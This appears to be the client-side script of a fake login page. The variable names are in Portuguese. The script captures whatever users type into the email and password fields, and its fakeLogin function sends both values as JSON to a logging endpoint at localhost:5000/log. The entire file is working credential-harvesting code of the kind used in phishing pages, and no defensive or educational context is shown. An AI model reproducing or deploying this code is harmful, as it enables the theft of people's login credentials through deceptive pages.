let emailInput = "";
let senhaInput = "";

document.getElementById("email").addEventListener("input", function (e) {
    emailInput = e.target.value;
});

document.getElementById("password").addEventListener("input", function (e) {
    senhaInput = e.target.value;
});

function fakeLogin() {
    const payload = {
        email: emailInput,
        senha: senhaInput
    };

    fetch("http://localhost:5000/log", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
        .then(response => response.json())
        .then(data => {
            console.log("Dados enviados:", data);
            emailInput = "";
            senhaInput = "";
        })
        .catch(error => {
            console.error("Erro ao enviar:", error);
        });
}
